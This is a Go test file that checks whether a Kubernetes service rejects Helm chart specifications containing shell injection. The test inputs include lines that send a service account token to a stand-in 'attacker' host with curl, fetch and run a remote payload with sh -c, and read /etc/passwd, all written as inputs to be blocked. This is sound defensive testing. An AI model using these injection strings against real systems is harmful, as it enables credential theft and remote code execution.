package kaas

import (
	"context"
	"strings"
	"testing"
)

func validPostInstallChart() PostInstallChartSpec {
	return PostInstallChartSpec{
		ChartName:    "ingress-nginx",
		ChartVersion: "4.11.3",
		RepoUrl:      "https://kubernetes.github.io/ingress-nginx",
		Namespace:    "ingress-nginx",
	}
}

func TestValidatePostInstallChart(t *testing.T) {
	tests := []struct {
		name    string
		mutate  func(*PostInstallChartSpec)
		wantErr bool
	}{
		{name: "valid https chart", mutate: func(*PostInstallChartSpec) {}},
		{name: "valid oci chart", mutate: func(s *PostInstallChartSpec) { s.RepoUrl = "oci://ghcr.io/org/charts" }},
		{name: "valid repo with port", mutate: func(s *PostInstallChartSpec) { s.RepoUrl = "https://charts.example.com:8443/stable/" }},
		{name: "valid version with v prefix", mutate: func(s *PostInstallChartSpec) { s.ChartVersion = "v1.2.3" }},
		{name: "valid prerelease version", mutate: func(s *PostInstallChartSpec) { s.ChartVersion = "1.2.3-rc.1+build.5" }},
		{name: "empty version means latest", mutate: func(s *PostInstallChartSpec) { s.ChartVersion = "" }},
		{name: "empty namespace means default", mutate: func(s *PostInstallChartSpec) { s.Namespace = "" }},

		// Shell injection attempts, one per field.
		{name: "command injection in chart name", mutate: func(s *PostInstallChartSpec) {
			s.ChartName = `a; curl -s http://attacker/$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); #`
		}, wantErr: true},
		{name: "command substitution in chart name", mutate: func(s *PostInstallChartSpec) { s.ChartName = "$(id)" }, wantErr: true},
		{name: "backticks in chart name", mutate: func(s *PostInstallChartSpec) { s.ChartName = "`id`" }, wantErr: true},
		{name: "injection in repo url", mutate: func(s *PostInstallChartSpec) { s.RepoUrl = "https://x;id" }, wantErr: true},
		{name: "substitution in repo url", mutate: func(s *PostInstallChartSpec) { s.RepoUrl = "https://x/$(id)" }, wantErr: true},
		{name: "injection in version", mutate: func(s *PostInstallChartSpec) { s.ChartVersion = "1.0.0 --post-renderer /bin/sh" }, wantErr: true},
		{name: "injection in namespace", mutate: func(s *PostInstallChartSpec) { s.Namespace = "default; id" }, wantErr: true},
		{name: "newline in chart name", mutate: func(s *PostInstallChartSpec) { s.ChartName = "a\nid" }, wantErr: true},

		// Other invalid inputs.
		{name: "missing chart name", mutate: func(s *PostInstallChartSpec) { s.ChartName = "" }, wantErr: true},
		{name: "missing repo url", mutate: func(s *PostInstallChartSpec) { s.RepoUrl = "" }, wantErr: true},
		{name: "uppercase chart name", mutate: func(s *PostInstallChartSpec) { s.ChartName = "Nginx" }, wantErr: true},
		{name: "chart name too long", mutate: func(s *PostInstallChartSpec) { s.ChartName = strings.Repeat("a", 54) }, wantErr: true},
		{name: "unsupported scheme", mutate: func(s *PostInstallChartSpec) { s.RepoUrl = "file:///etc/passwd" }, wantErr: true},
		{name: "credentials in repo url", mutate: func(s *PostInstallChartSpec) { s.RepoUrl = "https://user:pass@example.com" }, wantErr: true},
		{name: "query in repo url", mutate: func(s *PostInstallChartSpec) { s.RepoUrl = "https://example.com/?a=b" }, wantErr: true},
		{name: "repo url too long", mutate: func(s *PostInstallChartSpec) { s.RepoUrl = "https://example.com/" + strings.Repeat("a", 2048) }, wantErr: true},
		{name: "version range", mutate: func(s *PostInstallChartSpec) { s.ChartVersion = ">=1.0.0" }, wantErr: true},
		{name: "namespace with uppercase", mutate: func(s *PostInstallChartSpec) { s.Namespace = "Default" }, wantErr: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			spec := validPostInstallChart()
			tt.mutate(&spec)
			err := validatePostInstallChart(spec)
			if (err != nil) != tt.wantErr {
				t.Errorf("validatePostInstallChart() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

// TestCreateKaaSAppValues_PostInstallChart checks that an invalid post-install
// chart is rejected by CreateKaaSAppValues, so no values reach the chart.
func TestCreateKaaSAppValues_PostInstallChart(t *testing.T) {
	kaasConfig := KaaSConfig{
		StorageClasses: []ClassMapping{{Shortname: "sc1", Fullname: "storage-class-1"}},
	}
	group := Group{
		Name: "group-1", Replicas: 1, Cpu: 2, Memory: 4, BootDiskSize: 20,
		StorageClass: "sc1", Subnets: []GroupSubnet{{Order: 1, Id: "subnet-1"}},
	}
	specWith := func(pic PostInstallChartSpec) KaaSSpec {
		return KaaSSpec{
			KubeVersion: "v1.36.3", CPNetPol: "default", WorkersNetPol: "default",
			Groups: []Group{group}, PostInstallChart: pic,
		}
	}

	malicious := validPostInstallChart()
	malicious.ChartName = `a; sh -c "$(curl -s http://attacker/p)"; #`

	tests := []struct {
		name    string
		spec    KaaSSpec
		oldSpec *KaaSSpec
		wantErr bool
	}{
		{name: "no post install chart", spec: specWith(PostInstallChartSpec{})},
		{name: "valid post install chart", spec: specWith(validPostInstallChart())},
		{name: "malicious chart name on create", spec: specWith(malicious), wantErr: true},
		{name: "malicious chart name on update", spec: specWith(malicious), oldSpec: &KaaSSpec{PostInstallChart: validPostInstallChart()}, wantErr: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			values, _, err := CreateKaaSAppValues(context.Background(), "test-cluster", "test-loc", tt.spec, kaasConfig, tt.oldSpec)
			if (err != nil) != tt.wantErr {
				t.Fatalf("CreateKaaSAppValues() error = %v, wantErr %v", err, tt.wantErr)
			}
			if tt.wantErr && strings.Contains(values, "attacker") {
				t.Errorf("malicious value leaked into helm values: %s", values)
			}
		})
	}
}
